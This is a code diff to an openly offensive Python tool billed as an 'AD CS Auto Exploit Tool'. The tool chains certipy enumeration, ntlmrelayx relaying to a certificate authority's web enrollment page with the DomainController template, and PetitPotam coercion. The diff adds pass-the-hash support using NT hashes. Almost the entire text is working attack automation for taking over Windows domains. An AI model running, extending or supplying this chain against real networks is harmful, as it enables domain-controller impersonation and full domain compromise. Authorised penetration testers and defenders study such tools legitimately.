@@ -20,6 +20,8 @@ import threading
 import subprocess
 from termcolor import colored
 from requests.auth import HTTPBasicAuth
+from impacket.examples.utils import parse_credentials
+
 
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -29,8 +31,12 @@ def get_ip_address(ifname):
         struct.pack('256s', ifname[:15].encode('utf-8'))  # Encode string as bytes
     )[20:24])
 
-def login_and_get_status(dns_name, username, password):
+def login_and_get_status(dns_name, username, password, nthash):
     url = f"http://{dns_name}/certsrv/certfnsh.asp"
+    if nthash:
+        pretty_print("[!] Can't Verify Web Enrollment Server With Hashes, Proceeding As If True", verbose=True)
+        return 200
+
     try:
         pretty_print("[*] Trying to auth to " + url)
         response = requests.get(url, auth=HTTPBasicAuth(username, password))
@@ -75,8 +81,11 @@ def certipy_auth(certname,  domain, verbose=False):
     process.wait()
 
 
-def certipy_find(username, password, domain, verbose=False):
-    command = ["certipy", "find", "-u", username, "-p", password, "-target", domain, "-output", "adcs"]
+def certipy_find(username, password, nthash, domain, verbose=False):
+    if password is not None:
+        command = ["certipy", "find", "-u", username, "-p", password, "-target", domain, "-output", "adcs"]
+    else:
+        command = ["certipy", "find", "-u", username, "-hashes", nthash, "-target", domain, "-output", "adcs"]
     pretty_print("[*] " + " ".join(command))
 
     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -88,7 +97,7 @@ def certipy_find(username, password, domain, verbose=False):
         pretty_print(line, verbose)
     process.wait()
 
-def run_ntlmrelayx_and_petitpotam(username, password, domain, verbose=False):
+def run_ntlmrelayx_and_petitpotam(username, password, nthash, domain, verbose=False):
     with open("adcs_Certipy.json", "r") as file:
         data = json.load(file)
 
@@ -100,17 +109,24 @@ def run_ntlmrelayx_and_petitpotam(username, password, domain, verbose=False):
             dns_name = ca.get("DNS Name")
             if web_enrollment == "Enabled" and dns_name:
                 ca_found = True
-                if login_and_get_status(dns_name, username, password) == 200:
+                if login_and_get_status(dns_name, username, password, nthash) == 200:
                     ntlmrelayx_command = (
                         f"ntlmrelayx.py --target http://{dns_name}/certsrv/certfnsh.asp "
                         "--adcs --template DomainController"
                     )
                     pretty_print("[*] " + ntlmrelayx_command, verbose)
 
-                    petitpotam_command = (
-                        f"python PetitPotam.py -u {username} -p {password} "
-                        f"{get_ip_address('eth0')} {domain}"
-                    )
+                    if nthash:
+                        lmnthash = ":" + nthash
+                        petitpotam_command = (
+                            f"python PetitPotam.py -u {username} -hashes {lmnthash} "
+                            f"{get_ip_address('eth0')} {domain}"
+                        )
+                    else:
+                        petitpotam_command = (
+                            f"python PetitPotam.py -u {username} -p {password} "
+                            f"{get_ip_address('eth0')} {domain}"
+                        )
                     pretty_print("[*] " + petitpotam_command, verbose)
 
                     # Run ntlmrelayx
@@ -175,38 +191,84 @@ def save_certificate(username, base64_certificate):
 
 
 def main():
+
+    banner_big = """
+
+              ,,╓╔╗#▒▒▒╬▒╓
+              ╬╬╬╬╬▒╠└     ╔╔╔╔╔╔╔╔╔╔╔╔ç                          ,@@@@@@@@@@@@@m
+             ║╬╬╬╬╬╬╬▒     ╬╬╬╬╬╬╬╬╬╬╬╬╬              ╣▒▒╗╗╓,    ╔╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬ε
+            ]╬╬╬╬╬╬╬╬╬     ╬╬╬╬╬╬╬╬╬╬╬╬╬▒            ]╬╬╬╬╬╬╬╬╬ #╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
+            ╣╬╬╬╬╩╬╬╬╬▒    ╬╬╬╬╬╬╬╬╬╬╬╬╬╬µ         ,╔▒╬╬╬╬╬╬╬╬╬  "╣╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
+           ╔╬╬╬╬╬ ╢╬╬╬╬     ]╬╬╬╬╬╬╬╬L ╚╬╬     ,╔▒╣╬╬╬╬╬╬╬╬╬╬╬╬    `╝╬╬╬╬╬╬╬╬╬╬╬╬╬╬▒
+           ╬╬╬╬╬▓▓╬╬╬╬╬▒    ]╬╬╬╬╬╬╬╬L  ╬╬▒  [╣╬╬╬╬╬╬╬╝╙ ║╝╙`         ╚╬╬╬└╙╙╝╣╬╬╬╬
+          ╣╬╬╬╬╙   ╬╬╬╬╬    ]╬╬╬╬╬╬╬╬L  ╘╬╬  ║╬╬╬╬╬╬      ,φ╣╬Γ ,       ╙╬╬▒   ]╬╩
+      @▒╬╔╬╬╬╬╬    ║╬╬╬╬▒   ]╬╬╬╬╬╬╬╬L   ║╬▒  ╙╬╬╬╬╬╣╦,╔▒╬╬╬╬╬Γ ╚╬╬▓▒╗╗╓  ╙╣╬▒,
+     ║╬╬ ╬╬╬╬╬     '╬╬╬╬╬   ]╬╬╬╬╬╬╬╬▒╓╗@╣╬╬⌐   ╙╣╬╬╬╬╬╬╬╬╬╬╬╬Γ  ╢╬▒@╗▄▒    └╣╬▒╓
+     ╬╬╬╣╬╝╝╙`      ╢╬╬╬╬▒  ]╬╬╬╬╬╬╬╬╬╬╝╜╙`       "╣╬╬╬╬╬╣╜╠╢╝`  ╘╬╬╬╬╬╬╬╬╬▒@╗╬╬╬▓ε
+    "╙              ╚╬╬╬╬╬  ]╬╝╩╙╙`                 `╝╙   "       ║╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬Γ
+                     ╙╝╬╬╬▒                                        ╙╝╬╬╬╬╬╬╬╬╬╬╬╬╬Γ
+                          ╙                                              `╙╙╝╬╬╬╬╬Γ
+    """
+    # Create colored text variables
+    active_directory = colored("Active Directory Certificate Services", "white", attrs=["bold"])
+    tool_by = colored("AD CS Auto Exploit Tool by Leon Johnson aka", "white", attrs=["bold"])
+    handle = colored("@sho_luv", "yellow", attrs=["bold"])
+
+    # Combine colored text variables into banner
+    banner_small = """
+               #▒     ║▒▒╗╗,      é▒╗╖,   ╓╗#▒▒
+             ╒╣╣╙╣    ╠╬╜^╬╬╬    ╬╬▌^╣╣  ╣╬╬ ╙╝
+            ]╬╬,,╬▓-  ╠╬  ║╬╛    ║╬b      ╙╬▒
+            ║╬╣╙ ╟╬µ  ╬╬  ╣╩     ╣╬▌     ╔, ╟╬▒
+            ║╩  ,╬╬▒  ╙╣▒╣╙       ╙╝╣Å   └╬╬╝╜
+      
+           {}
+     {} {}
+       """.format(active_directory, tool_by, handle)
+
+
     parser = argparse.ArgumentParser()
-    parser.add_argument("domain_user_pass", help="domain.com/user:pass")
+    parser.add_argument('target', action='store', help='domain/username[:password]')
+
     parser.add_argument("-v", "--verbose", action="store_true", help="increase output verbosity")
-    args = parser.parse_args()
+    parser.add_argument("-p", "--password", action="store", help="Domain Password")
+    parser.add_argument("-hashes", action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
 
-    domain_user_pass = args.domain_user_pass.split("/")
-    if len(domain_user_pass) != 2:
-        print("Invalid domain/user:pass format")
+    if len(sys.argv)==1:
+        print( banner_small )
+        parser.print_help()
         sys.exit(1)
 
-    from getpass import getpass
+    options = parser.parse_args()
 
-    domain_user_pass = args.domain_user_pass.split("/")
-    if len(domain_user_pass) != 2:
-        print("Invalid domain/user:pass format")
+    domain, username, password = parse_credentials(options.target)
+
+    if domain == '':
+        logging.critical('Domain should be specified!')
         sys.exit(1)
 
-    domain = domain_user_pass[0]
-    user_pass = domain_user_pass[1].split(":")
-    if len(user_pass) != 2:
-        username = user_pass[0]
+    if password == '' and username != '' and options.hashes is None:
+        from getpass import getpass
+        password = getpass("Password:")
+
+    password = options.password
+    lmhash = nthash = ''
+
+    if options.hashes is not None and password is not None:
+        print("Error: You cannot provide both password and hashes.")
+        sys.exit(1)
+    elif options.hashes is not None:
+        lmhash, nthash = options.hashes.split(':')
+    elif password is None:  # No password or hashes provided, ask for password
+        from getpass import getpass
         print("Password not provided, please enter password: ")
         password = getpass()
         if not password:  # user didn't enter password
-            print("Invalid domain/user:pass format")
+            print("Invalid password")
             sys.exit(1)
-    else:
-        username = user_pass[0]
-        password = user_pass[1]
 
-    certipy_find(username, password, domain, args.verbose)
-    run_ntlmrelayx_and_petitpotam(username, password, domain, args.verbose)
+    certipy_find(username, password, nthash, domain, options.verbose)
+    run_ntlmrelayx_and_petitpotam(username, password, nthash, domain, options.verbose)
 
 
 if __name__ == "__main__":
